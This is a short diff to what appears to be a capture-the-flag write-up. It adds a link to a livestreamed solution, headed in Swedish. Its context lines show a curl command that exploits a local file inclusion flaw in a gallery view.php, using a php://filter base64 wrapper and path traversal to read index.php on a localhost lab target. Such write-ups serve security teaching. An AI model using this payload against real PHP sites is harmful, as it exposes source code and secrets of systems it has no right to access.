@@ -18,3 +18,7 @@ Go have a look at: URL.
 ```sh
 curl 'http://localhost:31337/img/gallery/view.php?p=php://filter/convert.base64-encode/resource=../../index.php' | base64 -d | head -n2
 ```
+
+## Lösning på livestream
+
+https://www.youtube.com/watch?v=CYBGQ9Zp6UQ&t=3240s
